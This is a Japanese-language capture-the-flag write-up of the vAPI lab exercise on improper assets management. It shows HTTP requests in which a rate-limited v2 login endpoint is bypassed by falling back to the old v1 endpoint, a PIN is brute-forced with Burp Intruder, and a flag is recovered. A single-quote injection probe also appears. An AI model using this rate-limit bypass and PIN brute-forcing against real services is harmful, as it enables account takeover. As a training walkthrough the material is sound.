## API9 Improper Assets Management
下位互換性の担保のためなどでAPIは古いバージョンのエンドポイントを残していることがある。  
古いバージョンには脆弱な問題が残っているかもしれない。

vAPIではご丁寧にv2がリリースされた体になっている。
> Hey Good News!!!!! We just launched our v2 API :)

v2エンドポイントのログインAPIを試行する。
```http
POST /vapi/api9/v2/user/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: f8f6172e-7f25-41c0-80a2-2d1fed0a3b39
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 56
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

{
    "username":"richardbranson",
    "pin":"****"
}
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:33:05 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:33:05 GMT
X-RateLimit-Limit: 5
X-RateLimit-Remaining: 4

```

先ほどのAPI8のようなSQLインジェクションは効かなそう。  
また、レスポンスヘッダを見るとどうやら回数制限があるらしい。
```http
POST /vapi/api9/v2/user/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: f8f6172e-7f25-41c0-80a2-2d1fed0a3b39
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 57
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

{
    "username":"richardbranson",
    "pin":"****'"
}
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:33:47 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:33:47 GMT
X-RateLimit-Limit: 5
X-RateLimit-Remaining: 3

```

API9は、古いエンドポイントがある可能性を示唆している。
`v2`を`v1`に変更するとエンドポイントが生きていて、回数制限もないのでIntruderで一通りのPINを試し、正解を見つける。
```http
POST /vapi/api9/v1/user/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 0630f3c8-f29c-4646-911d-70b7048e960b
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 56
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

{
    "username":"richardbranson",
    "pin":"1655"
}
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:49:36 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:49:36 GMT
Content-Type: application/json

{"id":1,"username":"richardbranson","accbalance":"flag{api9_81e306bdd20a7734e244}"}
```
